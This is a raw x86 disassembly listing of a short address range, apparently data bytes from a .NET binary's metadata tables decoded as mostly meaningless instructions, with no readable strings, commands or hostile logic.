  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 2a 18 7b    	add    %dl,0x7b182a08(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 37 18 7f    	add    %dl,0x7f183708(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 3f 15 1d    	add    %dl,0x1d153f08(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 50 15 72    	add    %dl,0x72155008(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 fe 01 0a    	add    %dl,0xa01fe00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 88 06 84    	add    %dl,-0x7bf97800(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 23 0f 89    	add    %dl,-0x76f0dd00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 e0 08 0a    	add    %dl,0xa08e000(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 a8 06 94 00 10    	add    %ch,0x10009406(%eax)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 b5 19 58 00 11    	add    %dh,0x11005819(%ebp)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 fc 08 9a    	add    %dl,-0x65f70400(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 32 02 9a    	add    %dl,-0x65fdce00(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 df 1e 0a    	add    %dl,0xa1edf18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 45 1c             	add    %al,0x1c(%ebp)
  4063c6:	0a 00                	or     (%eax),%al
  4063c8:	14 00                	adc    $0x0,%al
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	d9 1e                	fstps  (%esi)
  4063d4:	0e                   	push   %cs
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 01 17 0a    	add    %dl,0xa170100(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 fa 04 1d    	add    %dl,0x1d04fa00(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 89 18 1d    	add    %dl,0x1d188900(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 ac 16 1d    	add    %dl,0x1d16ac00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 e3                	add    %ah,%bl
  406419:	00 1d 00 14 00 20    	add    %bl,0x20001400
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 f2                	add    %dh,%dl
  406427:	00 1d 00 14 00 78    	add    %bl,0x78001400
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 d9 1e 0e    	add    %al,0xe1ed918(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 fb                	add    %bh,%bl
  406443:	1b c3                	sbb    %ebx,%eax
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 f5                	add    %dh,%ch
  406451:	0b c7                	or     %edi,%eax
  406453:	00 14 00             	add    %dl,(%eax,%eax,1)
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 4e 08             	add    %cl,0x8(%esi)
  406460:	53                   	push   %ebx
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 9e 09 1d    	add    %dl,0x1d099e00(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 d6 0e 0a    	add    %dl,0xa0ed600(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 d0 05 c3    	add    %dl,-0x3cfa3000(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 97 04 d5    	add    %dl,-0x2afb6900(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 4f 18 0a    	add    %dl,0xa184f00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 8f 15 c3    	add    %dl,-0x3cea7100(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 13 0c 1d    	add    %dl,0x1d0c1300(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 4e 07 0a    	add    %dl,0xa074e00(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 ac    	add    %al,-0x53df6a00(%eax)
  4064dd:	09 e0                	or     %esp,%eax
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 a7    	add    %al,-0x58df6a00(%eax)
  4064eb:	25 e4 00 16 00       	and    $0x1600e4,%eax
  4064f0:	00 00                	add    %al,(%eax)
  4064f2:	00 00                	add    %al,(%eax)
  4064f4:	80 00 96             	addb   $0x96,(%eax)
  4064f7:	20 eb                	and    %ch,%bl
  4064f9:	04 ec                	add    $0xec,%al
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 aa    	add    %al,-0x55df6a00(%eax)
  406507:	01 f1                	add    %esi,%ecx
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 3e    	add    %al,0x3e209600(%eax)
  406515:	14 f8                	adc    $0xf8,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 c6                	and    %al,%dh
  406523:	06                   	push   %es
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 7a 08 1c    	add    %dl,0x1c087a00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 2f 0e 0a    	add    %dl,0xa0e2f00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 ed                	add    %ch,%ch
  40654d:	05 0a 00 22 00       	add    $0x22000a,%eax
  406552:	f4                   	hlt
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 15 1c 23    	add    %dl,0x231c1500(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 c9                	add    %cl,%cl
  406569:	15 2a 01 24 00       	adc    $0x24012a,%eax
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 7d 0b 84    	add    %dl,-0x7bf48300(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 e6 0a 1d    	add    %dl,0x1d0ae600(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 df 1e 0a    	add    %dl,0xa1edf18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 a7 03 9a    	add    %dl,-0x65fc5900(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 4a 0a             	add    %cl,0xa(%edx)
  4065b0:	38 01                	cmp    %al,(%ecx)
  4065b2:	27                   	daa
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 b5 0e 0a    	add    %dl,0xa0eb500(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 80 09 3e    	add    %dl,0x3e098000(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 df                	sbb    %bl,%bh
  4065d9:	1e                   	push   %ds
  4065da:	0a 00                	or     (%eax),%al
  4065dc:	29 00                	sub    %eax,(%eax)
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	d9 1e                	fstps  (%esi)
  4065e8:	6b 01 29             	imul   $0x29,(%ecx),%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	50                   	push   %eax
  4065f5:	04 70                	add    $0x70,%al
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 fc 05 75    	add    %al,0x7505fc00(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	f3 16                	repz push %ss
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 0f 17 75    	add    %al,0x75170f00(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 f0 1c 7c 01    	addl   $0x17c1cf0,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 df 1e 0a    	add    %dl,0xa1edf18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 79 04             	add    %bh,0x4(%ecx)
  40664a:	c7 00 30 00 40 45    	movl   $0x45400030,(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 27                	add    %ah,(%edi)
  406657:	1c 84                	sbb    $0x84,%al
  406659:	01 31                	add    %esi,(%ecx)
  40665b:	00 9f 22 00 00 00    	add    %bl,0x22(%edi)
  406661:	00 96 00 e6 09 2a    	add    %dl,0x2a09e600(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 e6                	add    %ah,%dh
  406673:	15 93 01 33 00       	adc    $0x330193,%eax
  406678:	80 45 00 00          	addb   $0x0,0x0(%ebp)
  40667c:	00 00                	add    %al,(%eax)
  40667e:	96                   	xchg   %eax,%esi
  40667f:	00 7f 15             	add    %bh,0x15(%edi)
  406682:	93                   	xchg   %eax,%ebx
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 ec                	add    %ch,%ah
  40668f:	21 93 01 35 00 10    	and    %edx,0x10003501(%ebx)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40669e:	84 01                	test   %al,(%ecx)
  4066a0:	36 00 b9 22 00 00 00 	add    %bh,%ss:0x22(%ecx)
  4066a7:	00 96 00 f3 0a 99    	add    %dl,-0x66f50d00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 de 1b 9f    	add    %dl,-0x60e42200(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 1f 05 a5    	add    %dl,-0x5afae100(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 5a 03 ab    	add    %dl,-0x54fca600(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	d9 1e                	fstps  (%esi)
  4066e4:	0e                   	push   %cs
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 df 1e 0a    	add    %dl,0xa1edf18(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 d9 1e b1    	add    %al,-0x4ee126e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 5a 23             	or     %ebx,0x23(%edx)
  40670e:	bb 01 3c 00 40       	mov    $0x40003c01,%ebx
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 3d 24 bf 01 3c    	add    %edi,0x3c01bf24
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	68 22 0e 00 3c       	push   $0x3c000e22
  40672d:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 d9 1e cb    	add    %al,-0x34e126e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 bf 04 d7    	add    %al,-0x28fb4100(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 d1 16 dc    	add    %al,-0x23e92f00(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 c3 16 e2    	add    %al,-0x1de93d00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 19 0b e8    	add    %al,-0x17f4e700(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 23 19 ee    	add    %al,-0x11e6dcf8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	3e 16                	ds push %ss
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 21 14 6b 01    	addl   $0x16b1421,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 8d 03 0e 00    	addl   $0xe038d,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 70 0b d7 01    	addl   $0x1d70b70,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 ba 0a 0a 02    	addl   $0x20a0aba,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	44                   	inc    %esp
  4067d1:	04 dc                	add    $0xdc,%al
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 64 0b d7    	add    %al,-0x28f49c00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 8f 16 d7    	add    %al,-0x28e97100(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 1e 01 d7    	add    %al,-0x28fee200(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 d7 0a 0f 02    	addl   $0x20f0ad7,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 b2 18 0f 02    	addl   $0x20f18b2,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	f1                   	int1
  406825:	07                   	pop    %es
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 02 14 1a    	add    %al,0x1a140200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 92 01 1f    	add    %al,0x1f019200(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	bd 07 23 02 49       	mov    $0x49022307,%ebp
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	72 09                	jb     0x406867
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	74 1c                	je     0x406888
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	5c                   	pop    %esp
  406879:	08 31                	or     %dh,(%ecx)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 fe 07 36    	add    %al,0x3607fe00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 7b 0a             	add    %bh,0xa(%ebx)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 11 0e 42    	add    %al,0x420e1100(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 0e 01 42    	add    %al,0x42010e00(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	61                   	popa
  4068bf:	05 dc 01 50 00       	add    $0x5001dc,%eax
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	ba 03 0e 00 51       	mov    $0x51000e03,%edx
  4068d1:	00 c6                	add    %al,%dh
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 1e 07 6b    	add    %al,0x6b071e00(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 7f 16 47    	add    %al,0x47167f00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 36 06 4b    	add    %al,0x4b063600(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	ee                   	out    %al,(%dx)
  406905:	08 50 02             	or     %dl,0x2(%eax)
  406908:	53                   	push   %ebx
  406909:	00 1f                	add    %bl,(%edi)
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	62 0a                	bound  %ecx,(%edx)
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	6b 07 2b             	imul   $0x2b,(%edi),%eax
  406923:	02 55 00             	add    0x0(%ebp),%dl
  406926:	24 4d                	and    $0x4d,%al
  406928:	00 00                	add    %al,(%eax)
  40692a:	00 00                	add    %al,(%eax)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	04 07                	add    $0x7,%al
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	6d                   	insl   (%dx),%es:(%edi)
  40693d:	02 0f                	add    (%edi),%cl
  40693f:	02 57 00             	add    0x0(%edi),%dl
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	c4 1b                	les    (%ebx),%ebx
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	6f                   	outsl  %ds:(%esi),(%dx)
  406959:	06                   	push   %es
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	02 15 47 02 59 00    	add    0x590247,%dl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
